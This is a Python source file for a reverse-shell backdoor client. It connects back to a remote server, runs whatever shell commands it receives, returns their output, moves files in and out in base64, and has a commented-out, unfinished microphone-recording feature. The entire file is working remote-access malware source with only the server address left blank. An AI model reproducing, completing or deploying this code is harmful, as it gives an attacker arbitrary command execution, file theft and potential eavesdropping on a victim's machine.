import socket
import subprocess
import json
import os
# import speech_recognition as sr
import base64


class Client:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # here socket.AF_INET is your ipv4 and
        # socket.SOCK_STREAM is your tcp/ip
        self.connection.connect((ip, port))  # connection back to server

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)  # returning system command output

    def send_data(self, command):
        json_data = json.dumps(command)  # dump data into json object
        self.connection.send(json_data.encode())  # sending json object back to server

    def write_file(self, path, data):
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))  # write file to local file system
            return "[+] Upload successful."

    def receive_data(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)  # receiving json object from server
                return json.loads(json_data)  # unwrap json object
            except ValueError:
                continue  # if still data is pending continue the process

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing Working Directory to " + path

    # def record_mic(self, seconds):   Yet to complete
    #     recognizer = sr.Recognizer()
    #     with sr.Microphone() as source:
    #         recognizer.adjust_for_ambient_noise(source)
    #         recorded_audio = recognizer.listen(source, timeout=5, phrase_time_limit=10)
    #     try:
    #         speech_to_text = recognizer.recognize_google(recorded_audio, language="en-US")
    #         return speech_to_text
    #     except Exception as e:
    #         print(e)

    def read_file(self, path):
        with open(path, "rb") as file:  # reading file in binary to send data to server
            return base64.b64encode(file.read())  # base64 is use to encode unknown characters

    def run(self):
        while True:
            command = self.receive_data()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                # elif command[0] == "record" and command[1] == "mic" and len(command) > 2:
                #     command_result = self.record_mic(command[2])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception as e:
                command_result = str(e)
            self.send_data(command_result)


client = Client("", )  # use public ip of server to connect back
client.run()
